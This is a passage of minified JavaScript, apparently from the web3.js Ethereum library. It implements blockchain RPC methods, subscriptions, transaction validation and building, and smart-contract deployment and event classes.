        return fo(this, void 0, void 0, function*() {
            const n = yield Wk(t.requestManager);
            return ee({
                format: "uint"
            }, n, e ?? t.defaultReturnFormat)
        })
    }
    function sM(t, e) {
        return fo(this, void 0, void 0, function*() {
            return yield tO(t.requestManager, kt(e))
        })
    }
    function aM(t, e, n) {
        return fo(this, void 0, void 0, function*() {
            return (yield nO(t.requestManager, kt(e))).map(l => typeof l == "string" ? l : ee(co, l, n ?? t.defaultReturnFormat))
        })
    }
    function oM(t, e, n) {
        return fo(this, void 0, void 0, function*() {
            return (yield iO(t.requestManager, kt(e))).map(l => typeof l == "string" ? l : ee(co, l, n ?? t.defaultReturnFormat))
        })
    }
    class U_ extends oc {
        _buildSubscriptionParams() {
            return ["logs", this.args]
        }
        formatSubscriptionResult(e) {
            return ee(co, e, super.returnFormat)
        }
    }
    class KA extends oc {
        _buildSubscriptionParams() {
            return ["newPendingTransactions"]
        }
        formatSubscriptionResult(e) {
            return ee({
                format: "string"
            }, e, super.returnFormat)
        }
    }
    class Sd extends oc {
        _buildSubscriptionParams() {
            return ["newHeads"]
        }
        formatSubscriptionResult(e) {
            return ee(NO, e, super.returnFormat)
        }
    }
    class j_ extends oc {
        _buildSubscriptionParams() {
            return ["syncing"]
        }
        _processSubscriptionResult(e) {
            if (typeof e == "boolean")
                this.emit("changed", e);
            else {
                const n = Object.fromEntries(Object.entries(e?.status || e).map( ([s,o]) => [s.charAt(0).toLowerCase() + s.substring(1), o]));
                this.emit("changed", e.syncing),
                this.emit("data", ee(MO, n, super.returnFormat))
            }
        }
    }
    var Ie = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const Bp = {
        logs: U_,
        newPendingTransactions: KA,
        newHeads: Sd,
        syncing: j_,
        pendingTransactions: KA,
        newBlockHeaders: Sd
    };
    class sf extends mn {
        constructor(e) {
            if (typeof e == "string" || gd(e)) {
                super({
                    provider: e,
                    registeredSubscriptions: Bp
                });
                return
            }
            if (e.registeredSubscriptions) {
                super(e);
                return
            }
            super(Object.assign(Object.assign({}, e), {
                registeredSubscriptions: Bp
            })),
            this.getFeeData = this.calculateFeeData
        }
        setTransactionMiddleware(e) {
            this.transactionMiddleware = e
        }
        getTransactionMiddleware() {
            return this.transactionMiddleware
        }
        getProtocolVersion() {
            return Ie(this, void 0, void 0, function*() {
                return xk(this.requestManager)
            })
        }
        isSyncing() {
            return Ie(this, void 0, void 0, function*() {
                return Xw(this.requestManager)
            })
        }
        getCoinbase() {
            return Ie(this, void 0, void 0, function*() {
                return Sk(this.requestManager)
            })
        }
        isMining() {
            return Ie(this, void 0, void 0, function*() {
                return Tk(this.requestManager)
            })
        }
        getHashrate(e) {
            return Ie(this, void 0, void 0, function*() {
                var n;
                return e === void 0 && (e = (n = this.defaultReturnFormat) !== null && n !== void 0 ? n : $t),
                this.getHashRate(e)
            })
        }
        getHashRate() {
            return Ie(this, arguments, void 0, function*(e=this.defaultReturnFormat) {
                return PN(this, e)
            })
        }
        getGasPrice() {
            return Ie(this, arguments, void 0, function*(e=this.defaultReturnFormat) {
                return D0(this, e)
            })
        }
        getMaxPriorityFeePerGas() {
            return Ie(this, arguments, void 0, function*(e=this.defaultReturnFormat) {
                return HN(this, e)
            })
        }
        calculateFeeData() {
            return Ie(this, arguments, void 0, function*(e=BigInt(2), n=qd.Gwei) {
                var s;
                const o = yield this.getBlock(void 0, !1)
                  , l = (s = o?.baseFeePerGas) !== null && s !== void 0 ? s : void 0;
                let u;
                try {
                    u = yield this.getGasPrice()
                } catch {}
                let d;
                try {
                    d = yield this.getMaxPriorityFeePerGas()
                } catch {}
                let p;
                if (l) {
                    d = d ?? n;
                    let h;
                    typeof e == "number" ? h = BigInt(Math.floor(e * 1e3)) / BigInt(1e3) : h = e,
                    p = l * h + d
                }
                return {
                    gasPrice: u,
                    maxFeePerGas: p,
                    maxPriorityFeePerGas: d,
                    baseFeePerGas: l
                }
            })
        }
        getAccounts() {
            return Ie(this, void 0, void 0, function*() {
                var e;
                return ((e = yield Ik(this.requestManager)) !== null && e !== void 0 ? e : []).map(s => _i(s))
            })
        }
        getBlockNumber() {
            return Ie(this, arguments, void 0, function*(e=this.defaultReturnFormat) {
                return L0(this, e)
            })
        }
        getBalance(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultBlock, o=this.defaultReturnFormat) {
                return zN(this, n, s, o)
            })
        }
        getStorageAt(e, n) {
            return Ie(this, arguments, void 0, function*(s, o, l=this.defaultBlock, u=this.defaultReturnFormat) {
                return GN(this, s, o, l, u)
            })
        }
        getCode(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultBlock, o=this.defaultReturnFormat) {
                return qN(this, n, s, o)
            })
        }
        getBlock() {
            return Ie(this, arguments, void 0, function*(e=this.defaultBlock, n=!1, s=this.defaultReturnFormat) {
                return k_(this, e, n, s)
            })
        }
        getBlockTransactionCount() {
            return Ie(this, arguments, void 0, function*(e=this.defaultBlock, n=this.defaultReturnFormat) {
                return FN(this, e, n)
            })
        }
        getBlockUncleCount() {
            return Ie(this, arguments, void 0, function*(e=this.defaultBlock, n=this.defaultReturnFormat) {
                return QN(this, e, n)
            })
        }
        getUncle() {
            return Ie(this, arguments, void 0, function*(e=this.defaultBlock, n, s=this.defaultReturnFormat) {
                return VN(this, e, n, s)
            })
        }
        getTransaction(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultReturnFormat) {
                const o = yield YN(this, n, s);
                if (!o)
                    throw new Wb;
                return o
            })
        }
        getPendingTransactions() {
            return Ie(this, arguments, void 0, function*(e=this.defaultReturnFormat) {
                return ZN(this, e)
            })
        }
        getTransactionFromBlock() {
            return Ie(this, arguments, void 0, function*(e=this.defaultBlock, n, s=this.defaultReturnFormat) {
                return KN(this, e, n, s)
            })
        }
        getTransactionReceipt(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultReturnFormat) {
                const o = yield O_(this, n, s);
                if (!o)
                    throw new Wb;
                return o
            })
        }
        getTransactionCount(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultBlock, o=this.defaultReturnFormat) {
                return N_(this, n, s, o)
            })
        }
        sendTransaction(e, n=this.defaultReturnFormat, s) {
            return Xl(this, e, n, s, this.transactionMiddleware)
        }
        sendSignedTransaction(e, n=this.defaultReturnFormat, s) {
            return XN(this, e, n, s)
        }
        sign(e, n) {
            return Ie(this, arguments, void 0, function*(s, o, l=this.defaultReturnFormat) {
                return JN(this, s, o, l)
            })
        }
        signTransaction(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultReturnFormat) {
                return $N(this, n, s)
            })
        }
        call(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultBlock, o=this.defaultReturnFormat) {
                return U0(this, n, s, o)
            })
        }
        estimateGas(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultBlock, o=this.defaultReturnFormat) {
                return j0(this, n, s, o)
            })
        }
        getPastLogs(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultReturnFormat) {
                return M_(this, n, s)
            })
        }
        getWork() {
            return Ie(this, void 0, void 0, function*() {
                return sO(this.requestManager)
            })
        }
        submitWork(e, n, s) {
            return Ie(this, void 0, void 0, function*() {
                return aO(this.requestManager, e, n, s)
            })
        }
        requestAccounts() {
            return Ie(this, void 0, void 0, function*() {
                return cO(this.requestManager)
            })
        }
        getChainId() {
            return Ie(this, arguments, void 0, function*(e=this.defaultReturnFormat) {
                return D_(this, e)
            })
        }
        getNodeInfo() {
            return Ie(this, void 0, void 0, function*() {
                return fO(this.requestManager)
            })
        }
        getProof(e, n) {
            return Ie(this, arguments, void 0, function*(s, o, l=this.defaultBlock, u=this.defaultReturnFormat) {
                return WN(this, s, o, l, u)
            })
        }
        getFeeHistory(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultBlock, o, l=this.defaultReturnFormat) {
                return eM(this, n, s, o, l)
            })
        }
        createAccessList(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultBlock, o=this.defaultReturnFormat) {
                return L_(this, n, s, o)
            })
        }
        signTypedData(e, n, s, o) {
            return Ie(this, void 0, void 0, function*() {
                var l;
                return s === void 0 && (s = !1),
                o === void 0 && (o = (l = this.defaultReturnFormat) !== null && l !== void 0 ? l : $t),
                tM(this, e, n, s, o)
            })
        }
        subscribe(e, n, s) {
            return Ie(this, void 0, void 0, function*() {
                var o, l;
                s === void 0 && (s = (o = this.defaultReturnFormat) !== null && o !== void 0 ? o : $t);
                const u = yield(l = this.subscriptionManager) === null || l === void 0 ? void 0 : l.subscribe(e, n, s);
                return u instanceof U_ && e === "logs" && typeof n == "object" && !Ee(n.fromBlock) && Number.isFinite(Number(n.fromBlock)) && setImmediate( () => {
                    this.getPastLogs(n).then(d => {
                        for (const p of d)
                            u._processSubscriptionResult(p)
                    }
                    ).catch(d => {
                        u._processSubscriptionError(d)
                    }
                    )
                }
                ),
                u
            })
        }
        static shouldClearSubscription({sub: e}) {
            return !(e instanceof j_)
        }
        clearSubscriptions(e=!1) {
            var n;
            return (n = this.subscriptionManager) === null || n === void 0 ? void 0 : n.unsubscribe(e ? sf.shouldClearSubscription : void 0)
        }
        createNewPendingTransactionFilter() {
            return Ie(this, arguments, void 0, function*(e=this.defaultReturnFormat) {
                return nM(this, e)
            })
        }
        createNewFilter(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultReturnFormat) {
                return iM(this, n, s)
            })
        }
        createNewBlockFilter() {
            return Ie(this, arguments, void 0, function*(e=this.defaultReturnFormat) {
                return rM(this, e)
            })
        }
        uninstallFilter(e) {
            return Ie(this, void 0, void 0, function*() {
                return sM(this, e)
            })
        }
        getFilterChanges(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultReturnFormat) {
                return aM(this, n, s)
            })
        }
        getFilterLogs(e) {
            return Ie(this, arguments, void 0, function*(n, s=this.defaultReturnFormat) {
                return oM(this, n, s)
            })
        }
    }
    const lM = t => {
        if (!q(t.common)) {
            if (q(t.common.customChain))
                throw new tR;
            if (q(t.common.customChain.chainId))
                throw new nR;
            if (!q(t.chainId) && t.chainId !== t.common.customChain.chainId)
                throw new iR({
                    txChainId: t.chainId,
                    customChainId: t.common.customChain.chainId
                })
        }
    }
      , cM = t => {
        if (!q(t.common) && !q(t.chain) && !q(t.hardfork))
            throw new aR;
        if (!q(t.chain) && q(t.hardfork) || !q(t.hardfork) && q(t.chain))
            throw new oR({
                chain: t.chain,
                hardfork: t.hardfork
            })
    }
      , uM = t => {
        if (!q(t.common) && !q(t.common.baseChain) && !q(t.chain) && t.chain !== t.common.baseChain)
            throw new rR({
                txChain: t.chain,
                baseChain: t.common.baseChain
            })
    }
      , dM = t => {
        if (!q(t.common) && !q(t.common.hardfork) && !q(t.hardfork) && t.hardfork !== t.common.hardfork)
            throw new sR({
                txHardfork: t.hardfork,
                commonHardfork: t.common.hardfork
            })
    }
      , XA = t => {
        if (q(t.gas) || !nr(t.gas) || q(t.gasPrice) || !nr(t.gasPrice))
            throw new fR({
                gas: t.gas,
                gasPrice: t.gasPrice
            });
        if (!q(t.maxFeePerGas) || !q(t.maxPriorityFeePerGas))
            throw new v1({
                maxFeePerGas: t.maxFeePerGas,
                maxPriorityFeePerGas: t.maxPriorityFeePerGas
            })
    }
      , JA = t => {
        if (!q(t.gasPrice) && t.type === "0x2")
            throw new mR(t.gasPrice);
        if (t.type === "0x0" || t.type === "0x1")
            throw new v1({
                maxFeePerGas: t.maxFeePerGas,
                maxPriorityFeePerGas: t.maxPriorityFeePerGas
            });
        if (q(t.maxFeePerGas) || !nr(t.maxFeePerGas) || q(t.maxPriorityFeePerGas) || !nr(t.maxPriorityFeePerGas))
            throw new hR({
                maxPriorityFeePerGas: t.maxPriorityFeePerGas,
                maxFeePerGas: t.maxFeePerGas
            })
    }
      , fM = t => {
        const e = !q(t.gas) || !q(t.gasLimit)
          , n = e && !q(t.gasPrice)
          , s = e && !q(t.maxPriorityFeePerGas) && !q(t.maxFeePerGas);
        if (!n && !s)
            throw new cR({
                gas: t.gas,
                gasPrice: t.gasPrice,
                maxPriorityFeePerGas: t.maxPriorityFeePerGas,
                maxFeePerGas: t.maxFeePerGas
            });
        if (n && s)
            throw new dR({
                gas: t.gas,
                gasPrice: t.gasPrice,
                maxPriorityFeePerGas: t.maxPriorityFeePerGas,
                maxFeePerGas: t.maxFeePerGas
            });
        (n ? XA : JA)(t),
        (!q(t.type) && t.type > "0x1" ? JA : XA)(t)
    }
      , hM = (t, e, n={
        transactionSchema: void 0
    }) => {
        if (!q(e)) {
            e(t);
            return
        }
        if (typeof t != "object" || q(t))
            throw new pR(t);
        lM(t),
        cM(t),
        uM(t),
        dM(t);
        const s = pn(t, Ce, {
            transactionSchema: n.transactionSchema
        });
        if (fM(s),
        q(s.nonce) || q(s.chainId) || s.nonce.startsWith("-") || s.chainId.startsWith("-"))
            throw new gR({
                nonce: t.nonce,
                chainId: t.chainId
            })
    }
    ;
    var mM = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const pM = t => {
        var e, n;
        return Object.assign(Object.assign({}, t), {
            nonce: t.nonce,
            gasPrice: t.gasPrice,
            gasLimit: (e = t.gasLimit) !== null && e !== void 0 ? e : t.gas,
            to: t.to,
            value: t.value,
            data: (n = t.data) !== null && n !== void 0 ? n : t.input,
            type: t.type,
            chainId: t.chainId,
            accessList: t.accessList,
            maxPriorityFeePerGas: t.maxPriorityFeePerGas,
            maxFeePerGas: t.maxFeePerGas
        })
    }
      , gM = (t, e) => {
        var n, s, o, l, u, d, p, h, m, y, w, E, S, _, x, b, I, O;
        const z = !q(t.chain) && !q(t.hardfork) || !q(t.common);
        let L;
        if (!z)
            e.defaultCommon ? (L = Object.assign({}, e.defaultCommon),
            q(L.hardfork) && (L.hardfork = (n = t.hardfork) !== null && n !== void 0 ? n : e.defaultHardfork),
            q(L.baseChain) && (L.baseChain = e.defaultChain)) : L = It.custom({
                name: "custom-network",
                chainId: hn(t.chainId),
                networkId: q(t.networkId) ? void 0 : hn(t.networkId),
                defaultHardfork: (s = t.hardfork) !== null && s !== void 0 ? s : e.defaultHardfork
            }, {
                baseChain: e.defaultChain
            });
        else {
            const Y = (d = (u = (l = (o = t?.common) === null || o === void 0 ? void 0 : o.customChain) === null || l === void 0 ? void 0 : l.name) !== null && u !== void 0 ? u : t.chain) !== null && d !== void 0 ? d : "custom-network"
              , W = hn((m = (h = (p = t?.common) === null || p === void 0 ? void 0 : p.customChain) === null || h === void 0 ? void 0 : h.chainId) !== null && m !== void 0 ? m : t?.chainId)
              , D = hn((E = (w = (y = t?.common) === null || y === void 0 ? void 0 : y.customChain) === null || w === void 0 ? void 0 : w.networkId) !== null && E !== void 0 ? E : t?.networkId)
              , se = (x = (_ = (S = t?.common) === null || S === void 0 ? void 0 : S.hardfork) !== null && _ !== void 0 ? _ : t?.hardfork) !== null && x !== void 0 ? x : e.defaultHardfork
              , Z = (O = (I = (b = t.common) === null || b === void 0 ? void 0 : b.baseChain) !== null && I !== void 0 ? I : t.chain) !== null && O !== void 0 ? O : e.defaultChain;
            W && D && Y && (L = It.custom({
                name: Y,
                chainId: W,
                networkId: D,
                defaultHardfork: se
            }, {
                baseChain: Z
            }))
        }
        return {
            common: L
        }
    }
      , yM = (t, e, n, ...s) => mM(void 0, [t, e, n, ...s], void 0, function*(o, l, u, d=!1, p=!0) {
        const h = yield QO({
            transaction: o,
            web3Context: l,
            privateKey: u,
            fillGasPrice: d,
            fillGasLimit: p
        })
          , m = pn(h, Ce, {
            transactionSchema: l.config.customTransactionSchema
        });
        return hM(m, void 0, {
            transactionSchema: l.config.customTransactionSchema
        }),
        Ds.fromTxData(pM(m), gM(m, l))
    })
      , $A = ({address: t}, e, n) => {
        var s, o;
        const l = n?.topics
          , u = (s = n?.filter) !== null && s !== void 0 ? s : {}
          , d = {};
        if (Ee(n?.fromBlock) || (d.fromBlock = ee(wd.properties.number, n?.fromBlock, {
            number: Qn.HEX,
            bytes: er.HEX
        })),
        Ee(n?.toBlock) || (d.toBlock = ee(wd.properties.number, n?.toBlock, {
            number: Qn.HEX,
            bytes: er.HEX
        })),
        l && Array.isArray(l))
            d.topics = [...l];
        else if (d.topics = [],
        e && !e.anonymous && ![no, "allEvents"].includes(e.name) && d.topics.push((o = e.signature) !== null && o !== void 0 ? o : I0($i(e))),
        ![no, "allEvents"].includes(e.name) && e.inputs)
            for (const p of e.inputs) {
                if (!p.indexed)
                    continue;
                const h = u[p.name];
                if (!h) {
                    d.topics.push(null);
                    continue
                }
                Array.isArray(h) ? d.topics.push(h.map(m => Tp(p.type, m))) : p.type === "string" ? d.topics.push(Xa(h)) : d.topics.push(Tp(p.type, h))
            }
        return d.topics.length || delete d.topics,
        t && (d.address = t.toLowerCase()),
        d
    }
      , Rl = (t, e, n) => {
        const s = Array.isArray(t.inputs) ? t.inputs.length : 0;
        if (t.inputs && s !== e.length)
            throw new Wt(`The number of arguments is not matching the methods required number. You need to pass ${s} arguments.`);
        let o;
        if (t.inputs ? o = rf(Array.isArray(t.inputs) ? t.inputs : [], e).replace("0x", "") : o = CN(e).replace("0x", ""),
        JO(t)) {
            if (!n)
                throw new Wt("The contract has no contract data option set. This is necessary to append the constructor parameters.");
            return n.startsWith("0x") ? `${n}${o}` : `0x${n}${o}`
        }
        return `${Kl(t)}${o}`
    }
    ;
    class P_ extends oc {
        constructor(e, n) {
            super(e, n),
            this.address = e.address,
            this.topics = e.topics,
            this.abi = e.abi,
            this.jsonInterface = e.jsonInterface
        }
        _buildSubscriptionParams() {
            return ["logs", {
                address: this.address,
                topics: this.topics
            }]
        }
        formatSubscriptionResult(e) {
            return M0(this.abi, e, this.jsonInterface, super.returnFormat)
        }
    }
    Array.from({
        length: 256
    }, (t, e) => e.toString(16).padStart(2, "0"));
    const af = (t, e, n, s) => {
        var o, l;
        const u = {};
        return (!Ee(t.data) || s === "both") && (u.data = Rl(e, n, (o = t.data) !== null && o !== void 0 ? o : t.input)),
        (!Ee(t.input) || s === "both") && (u.input = Rl(e, n, (l = t.input) !== null && l !== void 0 ? l : t.data)),
        Ee(u.input) && Ee(u.data) && (u[s] = Rl(e, n)),
        {
            data: u.data,
            input: u.input
        }
    }
      , Cp = ({abi: t, params: e, options: n, contractOptions: s}) => {
        var o, l, u;
        if (!((u = (l = (o = n?.input) !== null && o !== void 0 ? o : n?.data) !== null && l !== void 0 ? l : s.input) !== null && u !== void 0 ? u : s.data) && !n?.to && !s.address)
            throw new Wt("Contract address not specified");
        if (!n?.from && !s.from)
            throw new Wt('Contract "from" address not specified');
        let p = Vr({
            to: s.address,
            gas: s.gas,
            gasPrice: s.gasPrice,
            from: s.from,
            input: s.input,
            maxPriorityFeePerGas: s.maxPriorityFeePerGas,
            maxFeePerGas: s.maxFeePerGas,
            data: s.data
        }, n);
        const h = af(p, t, e, n?.dataInputFill);
        return p = Object.assign(Object.assign({}, p), {
            data: h.data,
            input: h.input
        }),
        p
    }
      , vM = ({abi: t, params: e, options: n, contractOptions: s}) => {
        if (!n?.to && !s.address)
            throw new Wt("Contract address not specified");
        let o = Vr({
            to: s.address,
            gas: s.gas,
            gasPrice: s.gasPrice,
            from: s.from,
            input: s.input,
            maxPriorityFeePerGas: s.maxPriorityFeePerGas,
            maxFeePerGas: s.maxFeePerGas,
            data: s.data
        }, n);
        const l = af(o, t, e, n?.dataInputFill);
        return o = Object.assign(Object.assign({}, o), {
            data: l.data,
            input: l.input
        }),
        o
    }
      , bM = ({abi: t, params: e, options: n, contractOptions: s}) => {
        let o = Vr({
            to: s.address,
            gas: s.gas,
            gasPrice: s.gasPrice,
            from: s.from,
            input: s.input,
            data: s.data
        }, n);
        const l = af(o, t, e, n?.dataInputFill);
        return o = Object.assign(Object.assign({}, o), {
            data: l.data,
            input: l.input
        }),
        o
    }
      , WA = t => typeof t == "object" && !Ee(t) && Object.keys(t).length !== 0 && !Dr(t)
      , AM = ({abi: t, params: e, options: n, contractOptions: s}) => {
        if (!n?.to && !s.address)
            throw new Wt("Contract address not specified");
        if (!n?.from && !s.from)
            throw new Wt('Contract "from" address not specified');
        let o = Vr({
            to: s.address,
            gas: s.gas,
            gasPrice: s.gasPrice,
            from: s.from,
            input: s.input,
            maxPriorityFeePerGas: s.maxPriorityFeePerGas,
            maxFeePerGas: s.maxFeePerGas,
            data: s.data
        }, n);
        const l = af(o, t, e, n?.dataInputFill);
        return o = Object.assign(Object.assign({}, o), {
            data: l.data,
            input: l.input
        }),
        o
    }
    ;
    var wM = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class _M {
        _contractMethodDeploySend(e) {
            const n = {
                transactionResolver: s => {
                    if (s.status === BigInt(0))
                        throw new Wt("code couldn't be stored",s);
                    const o = this.parent.clone();
                    return o.options.address = s.contractAddress,
                    o
                }
                ,
                contractAbi: this.parent.options.jsonInterface,
                checkRevertBeforeSending: !1
            };
            return q(this.parent.getTransactionMiddleware()) ? Xl(this.parent, e, this.parent.defaultReturnFormat, n) : Xl(this.parent, e, this.parent.defaultReturnFormat, n, this.parent.getTransactionMiddleware())
        }
        constructor(e, n) {
            this.parent = e,
            this.deployOptions = n;
            const {args: s, abi: o, contractOptions: l, deployData: u} = this.calculateDeployParams();
            this.args = s,
            this.constructorAbi = o,
            this.contractOptions = l,
            this.deployData = u
        }
        send(e) {
            const n = Object.assign({}, e)
              , s = this.populateTransaction(n);
            return this._contractMethodDeploySend(s)
        }
        populateTransaction(e) {
            var n, s;
            const o = Object.assign(Object.assign({}, this.contractOptions), {
                from: (s = (n = this.contractOptions.from) !== null && n !== void 0 ? n : this.parent.defaultAccount) !== null && s !== void 0 ? s : void 0
            })
              , l = Cp({
                abi: this.constructorAbi,
                params: this.args,
                options: Object.assign(Object.assign({}, e), {
                    dataInputFill: this.parent.contractDataInputFill
                }),
                contractOptions: o
            });
            return l.dataInputFill && delete l.dataInputFill,
            l
        }
        calculateDeployParams() {
            var e, n, s, o, l, u;
            let d = this.parent.options.jsonInterface.find(E => E.type === "constructor");
            d || (d = {
                type: "constructor",
                stateMutability: ""
            });
            const p = ee({
                format: "bytes"
            }, (n = (e = this.deployOptions) === null || e === void 0 ? void 0 : e.input) !== null && n !== void 0 ? n : this.parent.options.input, $t)
              , h = ee({
                format: "bytes"
            }, (o = (s = this.deployOptions) === null || s === void 0 ? void 0 : s.data) !== null && o !== void 0 ? o : this.parent.options.data, $t);
            if ((!p || p.trim() === "0x") && (!h || h.trim() === "0x"))
                throw new Wt("contract creation without any data provided.");
            const m = (u = (l = this.deployOptions) === null || l === void 0 ? void 0 : l.arguments) !== null && u !== void 0 ? u : []
              , y = Object.assign(Object.assign({}, this.parent.options), {
                input: p,
                data: h
            });
            return {
                args: m,
                abi: d,
                contractOptions: y,
                deployData: p ?? h
            }
        }
        estimateGas(e) {
            return wM(this, arguments, void 0, function*(n, s=this.parent.defaultReturnFormat) {
                const o = Object.assign({}, n);
                return this.parent.contractMethodEstimateGas({
                    abi: this.constructorAbi,
                    params: this.args,
                    returnFormat: s,
                    options: o,
                    contractOptions: this.contractOptions
                })
            })
        }
        encodeABI() {
            return Rl(this.constructorAbi, this.args, ee({
                format: "bytes"
            }, this.deployData, this.parent.defaultReturnFormat))
        }
        decodeData(e) {
            return Object.assign(Object.assign({}, Rp(this.constructorAbi, e.replace(this.deployData, ""), !1)), {
                __method__: this.constructorAbi.type
            })
        }
    }
    var EM = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class xM extends yd {
        constructor(e, n) {
            super(e.requestManager, e.registeredSubscriptions),
            this.parentContract = n
        }
        subscribe(e, n) {
            const s = Object.create(null, {
                subscribe: {
                    get: () => super.subscribe
                }
            });
            return EM(this, arguments, void 0, function*(o, l, u=$t) {
                return s.subscribe.call(this, o, l ?? this.parentContract.options, u)
            })
        }
    }
    var fs = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const SM = {
        logs: P_,
        newHeads: Sd,
        newBlockHeaders: Sd
    };
    class Ss extends mn {
        get subscriptionManager() {
            return this._subscriptionManager
        }
        constructor(e, n, s, o, l) {
            var u, d, p;
            const h = Dr(n) ? n : Dr(s) ? s : void 0;
            let m;
            WA(n) ? m = n : WA(s) ? m = s : m = o;
            let y;
            if (typeof n == "object" && "provider"in n ? y = n.provider : typeof s == "object" && "provider"in s ? y = s.provider : typeof o == "object" && "provider"in o ? y = o.provider : y = Ss.givenProvider,
            super(Object.assign(Object.assign({}, m), {
                provider: y,
                registeredSubscriptions: SM
            })),
            this.syncWithContext = !1,
            this._functions = {},
            this._subscriptionManager = new xM(super.subscriptionManager,this),
            m?.wallet && (this._wallet = m.wallet),
            m?.accountProvider && (this._accountProvider = m.accountProvider),
            !q(h) && !q(h.data) && !q(h.input) && this.config.contractDataInputFill !== "both")
                throw new QT({
                    data: h.data,
                    input: h.input
                });
            this._overloadedMethodAbis = new Map;
            const w = Ki(o) ? o : Ki(s) ? s : l ?? this.defaultReturnFormat
              , E = typeof n == "string" ? n : void 0;
            this.config.contractDataInputFill = (u = h?.dataInputFill) !== null && u !== void 0 ? u : this.config.contractDataInputFill,
            this._parseAndSetJsonInterface(e, w),
            this.defaultReturnFormat !== w && (this.defaultReturnFormat = w),
            q(E) || this._parseAndSetAddress(E, w),
            this.options = {
                address: E,
                jsonInterface: this._jsonInterface,
                gas: (d = h?.gas) !== null && d !== void 0 ? d : h?.gasLimit,
                gasPrice: h?.gasPrice,
                from: h?.from,
                input: h?.input,
                data: h?.data
            },
            this.syncWithContext = (p = h?.syncWithContext) !== null && p !== void 0 ? p : !1,
            m instanceof mn && this.subscribeToContextEvents(m),
            Object.defineProperty(this.options, "address", {
                set: S => this._parseAndSetAddress(S, w),
                get: () => this._address
            }),
            Object.defineProperty(this.options, "jsonInterface", {
                set: S => this._parseAndSetJsonInterface(S, w),
                get: () => this._jsonInterface
            }),
            m instanceof mn && m.on(Ns.CONFIG_CHANGE, S => {
                this.setConfig({
                    [S.name]: S.newValue
                })
            }
            )
        }
        setTransactionMiddleware(e) {
            this.transactionMiddleware = e
        }
        getTransactionMiddleware() {
            return this.transactionMiddleware
        }
        get events() {
            return this._events
        }
        get methods() {
            return this._methods
        }
        clone() {
            let e;
            return this.options.address ? e = new Ss([...this._jsonInterface, ...this._errorsInterface],this.options.address,{
                gas: this.options.gas,
                gasPrice: this.options.gasPrice,
                from: this.options.from,
                input: this.options.input,
                data: this.options.data,
                provider: this.currentProvider,
                syncWithContext: this.syncWithContext,
                dataInputFill: this.config.contractDataInputFill
            },this.getContextObject()) : e = new Ss([...this._jsonInterface, ...this._errorsInterface],{
                gas: this.options.gas,
                gasPrice: this.options.gasPrice,
                from: this.options.from,
                input: this.options.input,
                data: this.options.data,
                provider: this.currentProvider,
                syncWithContext: this.syncWithContext,
                dataInputFill: this.config.contractDataInputFill
            },this.getContextObject()),
            this.context && e.subscribeToContextEvents(this.context),
            e
        }
        deploy(e) {
            return new _M(this,e)
        }
        getPastEvents(e, n, s) {
            return fs(this, void 0, void 0, function*() {
                var o;
                const l = typeof e == "string" ? e : no
                  , u = typeof e != "string" && !Ki(e) ? e : Ki(n) ? {} : n
                  , d = Ki(e) ? e : Ki(n) ? n : s ?? this.defaultReturnFormat
                  , p = l === "allEvents" || l === no ? bp : this._jsonInterface.find(b => "name"in b && b.name === l);
                if (!p)
                    throw new Wt(`Event ${String(l)} not found.`);
                const {fromBlock: h, toBlock: m, topics: y, address: w} = $A(this.options, p, u ?? {})
                  , E = yield M_(this, {
                    fromBlock: h,
                    toBlock: m,
                    topics: y,
                    address: w
                }, d)
                  , S = E ? E.map(b => typeof b == "string" ? b : M0(p, b, this._jsonInterface, d)) : []
